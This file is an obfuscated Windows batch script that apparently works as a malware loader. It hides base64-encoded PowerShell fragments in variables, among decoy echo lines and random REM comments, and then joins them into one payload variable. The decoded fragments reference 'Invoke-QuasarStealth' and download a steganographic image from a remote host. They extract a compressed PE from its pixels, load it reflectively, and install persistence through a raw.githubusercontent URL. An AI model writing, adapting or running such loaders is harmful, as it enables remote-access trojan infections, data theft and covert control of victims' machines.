@echo off
echo SVhYTHZMckh0a2o1dkFKN2ppdE9yRTd3Mmg2NXB3a3FCb1phT3BPOFA4WjAwckYxN2loSXBwNm9tUVVoY0t6Zm5iV1NEeGRrbHY= >nul 2>&1
echo ZDJuVnkwSXJMOU1MMmpta0Z3akVidGxEcnRXUzZ1amJMOFV4aDRUU1Y1NWVNVkttamw0R0JWcQ== >nul 2>&1
sE%zxR%T "XwStpGBiFBzXki=HSTUOgeKfjqZgdQJqlVvijEqIp"
SE%MVUXE%t "ETnjtjqSU=QcyNwcVpMPkbKkktZd"
echo ZktQelk4cmg4SWpYQnFQdGRmQ2s5OEZ4OEJqbGVYNHVGYWNsQUNHVkNXZGJyOTJGV1NkdA== >nul 2>&1
se%aWP%T "HKkOfhJA=AZMoOPJxRuhyL"
se%idrs%t "DxvoHFZaBJCO=zdGVtLlJlZmxlY3Rpb24uQmluZGluZ0ZsYWdzXSJQdWJsaWMsU3RhdGljIikgfCBXaGVyZS1PYmplY3Qgewokc3RyID0gJF8uVG9TdHJpbmcoKTsgKCRzdHJbMzddIC1lcSAnXScgLW9yICRzdHJbMzhdIC1lcSAnKScpI"
REM mirage guard kiln ruby echo kappa guard
sE%Kqbt%t "QgpmrcP=OQeShkKYaoIFIhpAWUkMIjpshUmyyqUZTY"
Se%BuC%T "HhCwTLW=oiXASrHfwjIl"
Se%Dby%t "ghXYviZuaE=hsBCsKxxFRuTkhmGCAbT"
REM guard phantom odyssey odyssey core echo
echo Vk50MXAwUXc3UUZYNmlMZ1JSZk1NRzV2akNZeFZXWm1VdnpoREpmcXFPbVFDZ0J4WjJSM1pJeHNzZm4= >nul 2>&1
SE%FooXP%T "SJNbGaczZBPo=NgrJmnFyMRTrCQHARUshKGacpOyMHubLIQy"
echo MnVGVnFzSk9wTEJXbWNick9KMDJtU3hSblVDc0RkYWNHTFhzSklwWnF1d25jMlBsSEc4ZFhuRGdaUFF4TWU5UTF3djU= >nul 2>&1
echo dkQzMThZU1I5M08yYUlvSXM2SHZvbWNwUm45OFkwdUFtY2dDTGgxUlgzeWhuWFdnRm5KakFPUm9GeEJKTERTVjg= >nul 2>&1
REM strobe undergrowth cipher glimmer
se%JgXr%T "KFYMer=tVDRPmdesrqvINtFxOko"
se%cfjRB%t "xQpeZvbNmU=ZRsCIlolcNW"
REM delta vision vertex delta
Se%QEHX%t "SMkVieoPaVoRHw=cGqbDzEeLTWEUcFoRUUjDbcTW"
REM phantom fragment beacon hawk sword guard vertex glimmer vertex delta
SE%OzQBk%t "yQMYLjiAYJUI=bIsfKiKvbkFksdTaCVAEqQeZEZ"
echo VHZCZWpxSmVuZ1ZlaWpIWE1uZkRCMWhaR1FBQTNFNDhHZWcwWWQ3Nmk0WWQ4OUZxNHZVYTh1Zg== >nul 2>&1
REM pixel hawk lance vertex core glimmer kiln cipher fragment
echo NEZoM1l5WlVsNEQwbTBaSDNyekNUUlVGaDRZU3BBZnE3Qzk5ZmQ4Sw== >nul 2>&1
echo SzVDT21uOFo3aGtZYzcyekVuemdDckcyMXc3Q0w5M3RXTUkwS0wxSzN2bHVGVXNxVFB0RVVtZFczVjFseEI= >nul 2>&1
REM phantom glimmer fragment fathom beacon delta lance binary
REM phantom binary echo undergrowth fragment twilight ruby lance vertex beacon
REM binary pixel beacon zenith
SE%CYXem%t "HovcHKoC=nHlJsKxXPsfuOeuIPceOxOe"
echo a2U2cE5DVXpjZUtiVFhxRXZWbjFYUUNPR1Nwdkp3MXE2dFlWbzZGakc4N1FkVTBUa1lnek96VG9rUmxwQlNCamhnZnVoMWZ1 >nul 2>&1
SE%Oiua%t "ZYLDgMGzXHXyj=XxNFNOvAdeQWisTOop"
REM guard delta clearing strobe kappa mirage kappa
REM clearing kappa zenith
REM twilight fathom guard kiln binary kappa twilight phantom binary
echo THhPN3lKaElOYVg5ZkF4TFk4Q282cGRyUmpzR210TnNocFpuNkt3TWtnQjFHelg2bkdS >nul 2>&1
SE%WCbKL%t "qSIFgoobNP=ggBfqFbyusQeYcCwjv"
REM cipher hawk cipher clearing guard phantom shadow hawk pixel
se%dlme%t "uKGsKaEPkSuCDg=QWoZNyuAXElelmGPTbq"
echo RDFHeXRwUFltVWNpMkkxOUJXcmVYakdNY0k3MTFNYmhYbG1YMUxqbUo= >nul 2>&1
se%ROBN%t "NAPjgGFDfsw=WYgKCRleHRyYWN0ZWQuQ291bnQgLWdlICRsZW5ndGgpIHsgJGRvbmUgPSAkdHJ1ZTsgYnJlYWsgfQp9CmlmICgkZG9uZSkgeyBicmVhayB9Cn0KJHBhY2tlZCA9ICRleHRyYWN0ZWQuVG9BcnJheSgpOyAkYm1wLkRpc3B"
REM kiln circle binary echo hawk hawk kappa fathom
REM fragment delta fragment circle fragment
REM zenith kappa strobe core sword strobe echo fathom delta odyssey
sE%XJK%t "TDlcXalUhhjFW=dHJvGMDDUOTKxUnyjirKJCO"
echo aFFDUDZ4dndKUzdmTEx2eEd0UmpVY1FBZk9oZnRjNWpMZEZYZVdodE04QjRGd0sxTGx5VVFrcGRyMHNwU0QyaUh3WUsycW41NmVrZ2dsa2U= >nul 2>&1
echo bGo0NFV2ZXI3eEtFSGVzdHJ6a3BhZnZKdm9TSjYxYmdKaWZiZlZyMlNlY2VkSlEwcXlMbXBlc2pEendRYWl1bg== >nul 2>&1
se%UpRH%t "NWcKTWcuWz=UukFFFhkMXbhsGdton"
se%JFSG%T "oqcMCX=YwxuAKTprxNQKEnzUHnVKnkpR"
REM core mirage odyssey guard mirage mirage ruby core glimmer
se%gKet%t "JCYPxMzWAeAklFb=iDxAQHAfmQsgZUXObKztbQOlsdyY"
REM hawk twilight circle undergrowth fragment zenith core
SE%MDA%T "bxCjiKm=EoHgFEKoOcxYOldIxmPWwBvWuQWAvH"
se%wrWMU%t "HycbmOjro=ifFeCkbvmaNLBtJlmuoaGuFBf"
echo dHFIc0oyTndaM1lmNTZtZlhvNzlEYmM1bmltSW1hckFXUUVBQmNhU2tPaHdQMA== >nul 2>&1
se%BpP%T "eLcBLU=fXJKMOFzYZFhrcDKnRiFjyLGXZcEsPbbn"
se%mld%T "LSTHqdctb=QMGmDYSharbGzgiznoTTIstcLjJHm"
se%nLi%T "PzKlaeLLS=3MuQ29weVRvKCRvdXRNcykKJHJhd1BFID0gJG91dE1zLlRvQXJyYXkoKQpMb2ctU2lsZW50ICJbK10gVW5jb21wcmVzc2VkIFNpemU6ICQoJHJhd1BFLkxlbmd0aCkgYnl0ZXMiCiRtc2NvcmxpYiA9IFtBcHBEb21haW5dOjpDdXJyZW"
REM beacon echo delta mirage valley zenith shadow undergrowth glimmer fragment
REM valley odyssey undergrowth
REM fragment echo fragment circle valley shadow glimmer binary pixel echo
REM twilight fragment pixel binary binary beacon phantom
REM fathom cipher binary delta clearing
Se%xmHxW%T "spsDaDkt=HWKFsqVzaerTg"
se%uZRg%T "NGMCtw=giaQcaqszoXl"
REM kappa kiln echo hawk mirage odyssey guard fragment shadow
echo cWdENGM5R0hITDJvU0xsNFhmdmdNaG1HaTVNcnBHaGw5akZobUdob0EwTDNxSlBkUlJ2TjhSWA== >nul 2>&1
REM pixel circle kappa beacon shadow ruby undergrowth strobe clearing clearing
sE%kLqG%T "yFaflHHVpV=WwufJgZyxyiUZUuxTibUFOZ"
se%eik%t "tViYZLGEjI=gCmBvlieAnvUzPlKhtZHlBsnzRWfPIfFs"
se%qckM%t "BupVSVkd=ixpbQcMKxABmOAChnbairgMkCCXOWgdLf"
REM valley binary circle clearing guard lance binary
echo WnU5SE5vbTdaNmFOSlF5U3FYTXN4OWZ4WnE4WkxLbGRYaGFHZU9uTDVacU54Yg== >nul 2>&1
echo NUdFQkVVZ3hUZDlxcTlsc2dOSmJwVlp5aDBCMDJqWkFPSlFmVzVXdUJoN0JOZEpOWVJ0NTRjVFluMk1oZkFpUA== >nul 2>&1
echo QWFJYmxDcGtqMXB2YUFnZG5LQ216S3hHUFFoNGJaN2VVbHM5d1pJUU9pc0kzM1lNRHdtZUI= >nul 2>&1
REM circle phantom phantom guard fragment twilight
REM binary shadow twilight
echo WGZ1UmgzWTdDZ01KWTNoWlloQ0N3VzVyc0dmT0N6NzJsNXZVaWV2Szk5QUZmbHpkTjVyTXpEdw== >nul 2>&1
REM clearing cipher fragment pixel hawk
REM sword sword fragment kiln odyssey
echo cXM1WG01UzR0YjJ4Sm80RDdyeUdDZUJ4MEdRNXhFaExPMnZGTzdCdENnQjFpWkxMVjBQQWd0NExZTVF0RTR1YWVQaVY2ZlZucHJJS3pH >nul 2>&1
SE%WQnB%t "tIYUQfdJFdYEF=aaZfNLwlpw"
SE%GoP%T "tZgGTCA=ptEIaojLJlsRVYADXlwv"
sE%ylYP%T "CCpPHN=JKhUqJyDhrdRRurFrLhfeWz"
se%kFr%T "BziTHjmwiEB=wHPBANVotgPxj"
REM glimmer twilight strobe guard glimmer kiln
sE%YNdeU%t "ekCJuAfElI=FIBCuLiheZ"
se%QAOTA%T "mCLmEe=rCUseNfYFeLE"
REM mirage kiln cipher strobe kiln zenith
Se%Skt%t "BDUDTZoqiHlDxkI=VVDNIZpjQbFyId"
echo cGYybDNINm5JalBFcFRpOW84dFhORnp4M3BkVEtFZ1NPUUNJampUU2ZTb2xvM2Yxa282MkVEN3JGdjFISTZnNVFCbldSaDhLNkxON3pq >nul 2>&1
REM echo strobe delta ruby zenith strobe
REM phantom undergrowth mirage ruby mirage kiln fragment fragment undergrowth
sE%pLI%t "lTUxDON=lbkqazoSfVytvU"
REM phantom circle pixel ruby glimmer delta binary
REM phantom binary guard
SE%ykQTk%T "gavjQbUOwbvv=b24uTWVzc2FnZSkiIH0KfQp9Ckludm9rZS1RdWFzYXJTdGVhbHRoIC1Tb3VyY2UgJHRhcmdldA=="
REM fathom guard kappa fragment strobe
se%vfMYU%T "dnEvJHNGCPyI=W9uKQpmdW5jdGlvbiBJbnZva2UtUXVhc2FyU3RlYWx0aCB7CnBhcmFtIChbc3RyaW5nXSRTb3VyY2UpCnRyeSB7CiRkYXRhID0gJG51bGwKaWYgKCRTb3VyY2UgLWxpa2UgImh0dHAqIikgewpMb2ctU2lsZW50ICJ"
se%NXa%T "gFIbpwtYTN=urgfVjvVWhBAfbECUUsNfganipbOpGy"
REM fathom clearing pixel hawk echo
se%jAWyT%t "JtvlFsbeYijcQ=IyNYHuhynKQgJRMcxemctUFzgLDoDFFeNp"
Se%DbIio%T "ZgUzmfu=KJGwJNPGDIYBv"
echo VHFDbno1WnpvdVdsWmY4R2hFS0xESHBmemlTWVJJUjl4a0Vnak1oMmRqYkw1bUY0dTcwRHZYR2RDZXZQaklIQ005ZlV4aHZ6 >nul 2>&1
echo UjYwRHRDT09HT2xEZ3l0dXRLTlExNlNsUVJsdnc2TTV0b3MwR1pSZ1YwZ01vUDZ6ZVhka2ZYVWZ1QWk2Y1llT0cwTFRtZkRqNFNh >nul 2>&1
echo OWt3VjY0NG5wUTFwaktTSnhWVll4OUppWmZ1MzBuc0hDM3hnYWtDZ01OZTJCVlY2clJWUDQ= >nul 2>&1
se%DzdCt%t "AnKJlsS=vQcUUtKBDbdsx"
SE%BNpU%t "grNexBUBY=pDDtrxagNDStLoBSAeIRyntPWofFXVVoK"
REM pixel sword mirage sword valley
SE%fhtzw%t "dXbQHo=SWQiuPPveBEhLD"
se%SmExz%t "VremXfdBT=lOjWdrnRGZwvrFYgQ"
Se%pVWe%t "HcOemUWbJxTi=RwLldpbkh0dHBSZXF1ZXN0LjUuMSIpCkh0dHAuT3BlbiAiR0VUIiwgdSwgRmFsc2UKSHR0cC5TZW5kCklmIEh0dHAuU3RhdHVzID0gMjAwIFRoZW4KdGVtcEZpbGUgPSBzaGVsbC5FeHBhbmRFbnZpcm9ubWVudFN0cmluZ3MoI"
echo VWFUUWVkRG95RDZFV2NLd3ZiMGQ0U25VUVQ0WHFYUGZaaktQZnpXNGxWSU03VWtPZ1BoUXNNdHlVcHV1MkoyNE9hOQ== >nul 2>&1
echo RkM0SGpiVXJvU0hab3FLbEdPWHpzUXVaTDR2WWpYaGJWVGpnR09EcGpNQlViMHMxNEdpSENZVkFtcGZpV2NzSk1hUg== >nul 2>&1
echo a2lvUkpPWG41NE1pRUJiZm5PSTFYOEplbEhSd3JncjJJU1VzeUpRcmQwOU8xZjVjRHVsRFJEUW5QSFgzdjQ= >nul 2>&1
se%xqv%t "EcCSdAys=IyFyFKvncMInUhgYGZCyuRtAaea"
echo TUFGTWNJeERwbGtiYjZkVU42WVMxNVkzaDhvckhHQk9qbW9vSWtJS1ZoS2VLTU5vV0pWaEMwUHlnTw== >nul 2>&1
REM shadow echo sword fragment phantom beacon odyssey echo core hawk
echo MXdOTkZ6NmxwVWVOSElqek42aU50T2dIc1F6VzA4Y3dYQ3ZLTWdjeFB1RXlCZmhFenRBa1ZqT2xqcTBHcmZtNmM4M0JZ >nul 2>&1
echo U1pXdVFxVmpHQzI2UGlEWWdCTXdkNWoyTHFVcEkxOTEwZU1UOHlOUzNlaWN1 >nul 2>&1
sE%KkYGi%t "SrARWl=KFRlc3QtUGF0aCAkU291cmNlKSB7CkxvZy1TaWxlbnQgIlsqXSBMb2FkaW5nIHN0ZWdvIGZyb20gbG9jYWwgcGF0aDogJFNvdXJjZSIKJGRhdGEgPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0"
Se%wWG%t "xnurOGQtQwGIxju=orolPBBPLNUBmnffFKa"
Se%EuQI%T "JwnkMWi=FKtaIpCNZTKGSNFbcsGNpsLsXnjgIakZtD"
echo bGVLNVJ1bEpBQUhEWThyV1FmbURYU01YY3BrMXcyTUNyQXVNZmJKeU9TVVU3NmU= >nul 2>&1
REM guard lance odyssey kappa strobe guard echo strobe guard
echo SDVUOERsRU5BRHJRM2dVZjRsOGtVRGlIaVh2RGVNbmsyc0cwcUp5YVF6bGxoRFhx >nul 2>&1
sE%LxlrJ%t "yhLmCm=bKl0gRG93bmxvYWRpbmcgc3RlZ28gZnJvbTogJFNvdXJjZSIKJHdjID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudAokd2MuSGVhZGVycy5BZGQoIlVzZXItQWdlbnQiLCAi"
sE%ZIoh%T "NHKqqUcbVqr=mfdtIWTMEinfoaVtNMJ"
echo VTVsRUtQOHh5NGFPZkp6b25HclJCNUszN1VUcVRBTElKSnNwVHFLYW9lQ09RMGhBbk1xT1RDb0xq >nul 2>&1
echo MUVsRGROQktpbXVVelhYd2NIbTlybmJxa3NsV2hydXR0akNRckdNVUlDZXZSTTI4dUF3Smt1cHVFdGNRUko3Q3BVRExiWmphN1hy >nul 2>&1
REM valley fathom mirage echo core phantom fathom
REM kappa circle binary
REM vision kiln sword binary
SE%gdmF%T "CKVGtIF=ypiOcRgbCzCHbxYHZJlCyLDADdOib"
SE%wQBJs%t "VjBJRqjShs=TlEGshcnIRDhplCxQGHddmHNev"
sE%cEd%T "etDzQx=hKknmBJxVV"
Se%hxmJz%t "imdNsuebuOi=IGHZMJSsSYfuraxbJTV"
echo ZDlwOFppUWFrWk9LcTJrRnFPeGtyUkp4d2dsRzdCTkhPcVhpSnFsTjhvY1Y= >nul 2>&1
REM guard phantom echo binary zenith guard mirage binary
Se%aVEq%t "ikXmWCG=geWV0LiIgIlllbGxvdyIKfSBlbHNlIHsKTG9nLVNpbGVudCAiWypdIFRyaWdnZXJpbmcgcGVyc2lzdGVuY2UgaW5zdGFsbGF0aW9uIGZvcjogJFBFUlNJU1RFTkNFX1VSTCIKSW5zdGFsbC1QZXJzaXN0ZW5jZSAtU3RhZ2VyVXJsICRQRV"
sE%FIuY%T "tormoLMtt=ppwYiwgGhTrvpzFUhnikKusmhfrHXQ"
sE%uubEU%t "rEkjEOiZ=wJEEBowMjPYcEGRi"
SE%CvQN%T "OmUgIZ=VvjKHVvMwBVSXBET"
echo a0xVMk1DQ0JMNHBnR0RBVTVISUYySUpxdUVldEtMMFlMU0pVQVpob0J1YjVOTXA0NkVqS0ZUekk= >nul 2>&1
echo ak9Qem44SGNRMjVCSkxkTkREWjVPbHhvN3R2QW1aMHk4ZEZPWHpsUVRsdHBSOGNqSTBhMHVLMW4zQzBiS0lxbVJtQnBCbUJhN3M= >nul 2>&1
REM core lance phantom guard circle fathom cipher shadow binary
echo b2g0TGpob2VSTTY1cjQ4RUJUdTN4TmRFWWV6dGtKb1BxdmJVem9ScVFm >nul 2>&1
se%dSDvF%T "akQAhYlqCcKVS=MyRnWYFslMvB"
Se%djs%t "ufkXBZFit=puhwrzfotRfZCQuiedhkADDnwHFH"
SE%Seid%t "kVXaSy=CIJfgyZnuuAwXqtVATbgnZsEyTtBSu"
REM zenith twilight strobe guard circle fathom echo phantom
REM vision delta lance
REM echo cipher lance valley hawk vertex
echo MURlelJMS3ZJczFpZVN4aWJHVU0wYWVSTXd4eUJWZDlLQ0dsb1B5a0g5OEw= >nul 2>&1
se%ReVV%t "hLXbbHEtnwxM=oiWauPDfvZHIomRskByca"
echo bktvS1docnNDSlV0UGtrdGdwUG9yNFBqalVvNmhmdGpyR3hjaVE4azUxQnJ2UlpzZGFTb01HYmg= >nul 2>&1
sE%dkaMN%T "oZCrBlJvPXjhS=oJxnvsgPUZFvKsVmwI"
se%qULd%t "orEWFa=ixjwtOdRmDniWFvNfPGrxf"
REM fragment lance odyssey odyssey clearing beacon
REM fathom kiln delta binary zenith binary kappa
SE%Ytna%t "GqOlqIVI=qTXcmZqfYoQRyBc"
Se%TDJO%t "biYVcBDkenQ=ZXNzYWdlKSIgIlllbGxvdyIKfQp9CiRQRVJTSVNURU5DRV9VUkwgPSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3doYXRldmFib3kvY3VybHljYXJuaXZhbC9tYWluL3VzZX"
echo bmFzMHlNdTZmQVpxTGVGU1Y2bXgxYVB0WUpLQmdVR3Qyd2NKUmN0ZEE= >nul 2>&1
REM sword hawk vertex
echo ZlFhTloxdHcwMnJlYVB6VnBUeENJbHA2R1RHeGFzTG11cWt6MG1TRWN3SmlJNHZ0V0R3U0JCczFIeGhFeHN3NHUyemlLd0tkd0Fz >nul 2>&1
se%CCMT%T "rgLmCOjx=ZMvUOiQBETOLbnYWiF"
SE%bhky%T "gOGRHWQOSnpzt=FXxlhkJUfB"
SE%xmUJH%T "afXgmJUTotX=zeWJqJizGHbrsmKAqhSuV"
Se%ghdcM%T "kyWNqlVYdd=uUZLfVOqwEePcxObjDsuCVKOpLUT"
Se%Yhr%t "PvTQmlTZoz=EyJaClhCNSnqvumbkWftxTVcVfGLjLxyc"
Se%xsB%T "TFBgyWQqQviv=tHHsZdqCDPExBR"
echo cW5TS2lwVEl1NzdmRlIzUzFlNGJhMFFhckU1ZnlYanlvdlU0bkE3Z05JalR6WnFEVUFZNFVFODZUOHZjdVp5ZXd2dzE= >nul 2>&1
REM kappa lance fragment guard lance shadow phantom valley shadow
REM hawk binary beacon strobe guard lance delta kiln ruby valley
SE%AHSJ%t "hAjXhWhSyhtijG=nwwqThnVwTMsbOlErL"
se%Skc%t "EVxVBUkRaBymQXi=SMKuZtQVhMPOBCVWNwIOMnQwX"
Se%idVBn%t "faipRzIGh=COZGetvVdtKdzSfmlwNpR"
SE%iaDt%T "kVDnchJUeSTO=iIjKLnArqprHYtnbKZrupzsMVycUESeMpF"
echo QlJjZnV2ZGdZQ1I3Qk9sWjVLaWh4a1p1YXdJTEtJVW85ZVlUVGwzZVc3T3ZLNkRLSWNyZnZkZkV1Sw== >nul 2>&1
sE%haMKj%T "bjHvXbzbtV=oBxJGXlkentIBvPYFVNUULCNraLm"
SE%toz%T "GqKnhg=nJvcjogJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiICJXaGl0ZSIgJHRydWUKaWYgKCRfLkV4Y2VwdGlvbi5Jbm5lckV4Y2VwdGlvbikgeyBMb2ctU2lsZW50ICJJbm5lcjogJCgkXy5FeGNlcHRpb24uSW5uZXJFeGNlcHRp"
se%qxaUd%t "SezSvKID=avoKADCWQKnClb"
REM strobe glimmer sword hawk fathom vision fathom
REM delta binary pixel phantom undergrowth undergrowth kappa mirage delta vision
REM phantom glimmer twilight kappa binary sword phantom binary valley vision
se%WoB%T "cQJheazW=TFZsheJCpyTTvAwwwFPbwEFIRZUPRh"
Se%BfkDn%t "cISUnH=4IC1lcSAxKSkgeyBjb250aW51ZSB9CiRweCA9ICRibXAuR2V0UGl4ZWwoJHgsICR5KQokZXh0cmFjdGVkLkFkZCgkcHguUik7IGlmICgkZXh0cmFjdGVkLkNvdW50IC1nZSAkbGVuZ3RoKSB7ICRkb25lID0"
REM kiln beacon binary lance odyssey
REM vision fathom lance valley fathom odyssey ruby circle vertex cipher
REM core ruby circle
SE%jIt%t "vvTuAeoTI=jsmpxtGtyDhIYncCCDIlzBntQObjfgkeVG"
echo VERBMlRmZG1IbFJZMDFFUGNhOEVZa1hqb0hLendnVEdXY1dkNm5UZkFwT2JJSFE= >nul 2>&1
Se%YrB%t "xLzzSo=yyjwspCVleNSbkQXOcrNrSMdkBJeDdkp"
sE%kcZu%T "BZfareQcMTULvlg=xjgCLGteqFhNapIO"
sE%doI%T "oCXpNWP=gzvVzUBLYfLLXJhzXJMuFvKjrY"
REM vertex beacon delta hawk
REM circle twilight cipher vision sword sword cipher undergrowth guard
Se%CRf%t "GTelxvAKSYU=dGVycygpLkNvdW50IC1lcSAwKSB7CiRlbnRyeS5JbnZva2UoJG51bGwsICRudWxsKQp9IGVsc2Ugewokc3RhcnIgPSBbc3RyaW5nW11dQCgpCiRlbnRyeS5JbnZva2UoJG51bGwsIEAoLCRzdGFycikpCn0KTG9nLVNpbGVudCAiWytdI"
REM fragment mirage kiln pixel
REM vision delta twilight clearing valley ruby clearing
REM kiln kiln vertex vision sword
echo dGVKd0pqZXVzdUpWYlQ5SzdqeWlpQXYxakVyd2xXWjRJV0lxcFBLRGNsS2xkS2xEaDNLNDJUb09iMUU4RE5zYk84dnM4cGRzNWtSTWJCRnA= >nul 2>&1
REM pixel sword circle
REM binary mirage twilight glimmer clearing
REM undergrowth vertex delta strobe beacon binary guard vertex circle circle
sE%UsgNE%t "JNtgvW=hnSUSNkhVkHmUuayATmvZCGgB"
REM zenith vertex twilight hawk shadow sword vertex phantom beacon strobe
REM glimmer kiln twilight hawk hawk
sE%aLcPE%t "RfoUUj=XoONtAmRJtqEQcyKUvHbjcUttlghw"
REM kiln circle binary mirage circle
se%Lce%T "JctPAGx=vxGhdDInOyL"
echo UGRPa0JmNkFGeEZqQUdjbEN5VE1kaUd1TXdWUHY5bEdRbHowTkZSVEV3R1Z6QVRXb1pjdlhrS0ZlQU5GVFZxQ1RTbjZYSFpI >nul 2>&1
REM guard vision shadow twilight fathom delta
sE%Dgzx%T "khTUhqAXG=aQszEKoXrFtcGxfolzBohUNlBMi"
sE%iHAO%T "CHcAraffhQTK=CjusZeauoP"
REM phantom core sword core
REM valley valley fathom undergrowth echo binary beacon undergrowth sword
se%ysppW%t "hBERRDfc=tizuSyLkYeQJUAqzVhwGUHyYVWZdpROMW"
echo bWhWTEhORTJMVjYxcDVuekxsMVYzS2xMZjlUdmV5Z05lSEU3NllCdWNLZUI4YjM1QU8= >nul 2>&1
REM beacon fragment ruby glimmer twilight valley glimmer
se%HiJ%t "cBPMHc=FaMbHnamGtMrVWMNyCyhASwxWVBGrfd"
echo WVRxbTlKRDdhUWswTW9POVFnMGY0S1h2bWQ1cms4Q0pjV1RESjBwc0wybVlnczdkQWNadEd5VkYyV3hpVlh5T1Bwdlp6 >nul 2>&1
REM echo vision guard hawk sword beacon circle strobe
REM core undergrowth ruby glimmer vision guard circle hawk
se%ssp%T "qlLVPPnclayAnO=cMcLUPkIhrgHVzHbBeJmxDLznewiTa"
SE%xQe%T "JqADsiDQN=fUlLxohLGRUcny"
REM pixel echo vertex valley glimmer kiln circle ruby
SE%Mww%t "MAMVzIVoH=SFaRJZptRrVaXkJeG"
REM kappa delta vision
REM fathom lance kappa kappa
sE%NiF%t "VfVNKUkNYN=FAEtGfssXpVIkDIqqnSDDBFoRE"
REM core guard phantom
sE%hWyTU%t "CsJmJh=zgOGJtYBzVptXdJPhG"
REM vision beacon glimmer
REM vision delta echo
se%RJDJt%t "zzjpZpQEMbwJ=UTNwPPCzRepkYRTZwuAOFAsav"
echo cUtJb0pPM3RxZ2hseFlpelhxQ3hjbDZsVUNKT3ptdzRIZDRXTDl4Y1EyZ0hXbm1r >nul 2>&1
REM binary undergrowth hawk kappa glimmer vertex shadow zenith
SE%EmNS%t "VLKkAdA=WZPIEoYVzvTmnuUraHghIEirfbq"
Se%mKvA%t "witSYCjFJpbwd=yialuEZqJsSLSgu"
REM twilight cipher undergrowth

REM --- Reconstructing Payload Variable ---
set "ocIxBfHG=%ocIxBfHG%%lybmSwTFZ%"
set "ocIxBfHG=%ocIxBfHG%%GShjykGNjtB%"
set "ocIxBfHG=%ocIxBfHG%%soNqMxD%"
set "ocIxBfHG=%ocIxBfHG%%WDwQNiOhuDLH%"
set "ocIxBfHG=%ocIxBfHG%%VGfUyMYJ%"
set "ocIxBfHG=%ocIxBfHG%%IioLlN%"
set "ocIxBfHG=%ocIxBfHG%%qlWomP%"
set "ocIxBfHG=%ocIxBfHG%%tEiIQB%"
set "ocIxBfHG=%ocIxBfHG%%ClFTbZGpujJi%"
set "ocIxBfHG=%ocIxBfHG%%BPAgMjELCBo%"
set "ocIxBfHG=%ocIxBfHG%%DQAKlxCt%"
set "ocIxBfHG=%ocIxBfHG%%IudUedVHi%"
set "ocIxBfHG=%ocIxBfHG%%HcOemUWbJxTi%"
set "ocIxBfHG=%ocIxBfHG%%fWdSmsVuD%"
set "ocIxBfHG=%ocIxBfHG%%pTUyGhOs%"
set "ocIxBfHG=%ocIxBfHG%%CxvAnanTEAMz%"
set "ocIxBfHG=%ocIxBfHG%%havGRhxK%"
set "ocIxBfHG=%ocIxBfHG%%biYVcBDkenQ%"
set "ocIxBfHG=%ocIxBfHG%%wJaKsAEdbHAr%"
set "ocIxBfHG=%ocIxBfHG%%qtDAXoD%"
set "ocIxBfHG=%ocIxBfHG%%ikXmWCG%"
set "ocIxBfHG=%ocIxBfHG%%TdwmslqsbUc%"
set "ocIxBfHG=%ocIxBfHG%%cYQdKfaH%"
set "ocIxBfHG=%ocIxBfHG%%JJQibaKR%"
set "ocIxBfHG=%ocIxBfHG%%FEWJytF%"
set "ocIxBfHG=%ocIxBfHG%%dnEvJHNGCPyI%"
set "ocIxBfHG=%ocIxBfHG%%yhLmCm%"
set "ocIxBfHG=%ocIxBfHG%%HtsxofviF%"
set "ocIxBfHG=%ocIxBfHG%%SrARWl%"
set "ocIxBfHG=%ocIxBfHG%%YYrLUT%"
set "ocIxBfHG=%ocIxBfHG%%KErYfUDiuio%"
set "ocIxBfHG=%ocIxBfHG%%RvjpCIsQaErX%"
set "ocIxBfHG=%ocIxBfHG%%pkzgIzwOgQe%"
set "ocIxBfHG=%ocIxBfHG%%jIWfqQNzL%"
set "ocIxBfHG=%ocIxBfHG%%cISUnH%"
set "ocIxBfHG=%ocIxBfHG%%TihSmPRxIceW%"
set "ocIxBfHG=%ocIxBfHG%%NAPjgGFDfsw%"
set "ocIxBfHG=%ocIxBfHG%%eXMqMZYpANu%"
set "ocIxBfHG=%ocIxBfHG%%pbhbMKOyN%"
set "ocIxBfHG=%ocIxBfHG%%PzKlaeLLS%"
set "ocIxBfHG=%ocIxBfHG%%YRWjobAj%"
set "ocIxBfHG=%ocIxBfHG%%OsybKDFI%"
set "ocIxBfHG=%ocIxBfHG%%DxvoHFZaBJCO%"
set "ocIxBfHG=%ocIxBfHG%%UuZTAf%"
set "ocIxBfHG=%ocIxBfHG%%CcqJaL%"
